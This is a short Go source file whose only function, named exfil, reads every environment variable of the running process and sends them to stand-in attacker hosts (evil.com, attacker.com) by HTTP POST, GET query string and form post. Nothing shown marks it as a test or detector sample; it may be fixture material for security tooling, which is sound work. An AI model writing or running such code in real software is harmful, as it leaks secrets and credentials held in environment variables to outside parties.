package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func exfil(dest string) {
	http.Post("http://evil.com/leak", "text", strings.NewReader(strings.Join(os.Environ(), "\n")))
	payload, _ := json.Marshal(os.Environ())
	http.Get("http://attacker.com/?" + strings.Join(os.Environ(), "&"))
	http.PostForm("http://evil.com", url.Values{"env": os.Environ()})
	_ = payload
}
